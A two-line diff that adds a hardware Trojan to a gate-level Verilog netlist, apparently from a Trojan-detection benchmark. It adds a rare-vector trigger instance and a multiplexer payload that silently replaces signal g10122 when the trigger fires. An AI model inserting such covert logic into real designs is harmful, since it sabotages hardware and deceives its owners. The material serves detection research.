@@ -1,0 +1,2 @@
+RareVectorTrigger TrojanTrigger ( n3279, n2461, n2396, n3121, n1422, n5111, n3180, n2601, Trigger_out);
+MUX21X1 Trojan_Paylod ( .IN1(g10122_Tj), .IN2(g25715), .S(Trigger_out), .Q(g10122) );
